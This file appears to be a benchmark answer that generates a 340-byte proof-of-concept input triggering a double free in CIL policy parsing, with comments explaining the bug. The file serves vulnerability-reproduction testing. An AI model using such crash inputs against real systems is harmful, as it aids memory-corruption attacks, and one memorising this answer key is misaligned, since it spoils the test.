import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double free in the CIL AST construction when an
        # anonymous classpermission is passed to a macro and then assigned to a
        # named classpermissionset.
        #
        # 1. An anonymous classpermission `(class_name (perm_name))` is created as a
        #    macro argument.
        # 2. A macro takes this as an argument `arg_name`.
        # 3. Inside the macro, a named classpermissionset `set_name` is defined
        #    using `arg_name`. This makes `set_name` point to the anonymous
        #    classpermission's data structure.
        # 4. The parser, after expanding the macro, frees the anonymous argument as
        #    it's temporary.
        # 5. During AST destruction, the named `classpermissionset set_name` is
        #    destroyed, which tries to free the same data structure again,
        #    causing a double free.
        #
        # The core PoC structure is:
        # (block ...
        #   (class ... (...))
        #   (macro ... ((classpermission ...))
        #     (classpermissionset ... ...)
        #   )
        #   (call ... ((... (...))))
        # )
        #
        # To match the ground-truth length of 340 bytes, we pad the identifiers.
        # The total length is the sum of the base template and the lengths of all
        # identifiers multiplied by their occurrences.
        # Total length = 84 + P*1 + C*2 + R*2 + M*2 + A*2 + S*1 = 340
        # P + 2C + 2R + 2M + 2A + S = 256
        # We choose lengths that satisfy this equation.
        
        p_len = 28  # block name
        c_len = 25  # class name
        r_len = 25  # permission name
        m_len = 25  # macro name
        a_len = 25  # argument name
        s_len = 28  # set name

        p_name = 'p' * p_len
        c_name = 'c' * c_len
        r_name = 'r' * r_len
        m_name = 'm' * m_len
        a_name = 'a' * a_len
        s_name = 's' * s_len

        poc_template = '(block {p} (class {c} ({r}))(macro {m}((classpermission {a}))(classpermissionset {s} {a}))(call {m}(({c} ({r})))))'

        poc_string = poc_template.format(
            p=p_name,
            c=c_name,
            r=r_name,
            m=m_name,
            a=a_name,
            s=s_name
        )

        return poc_string.encode('utf-8')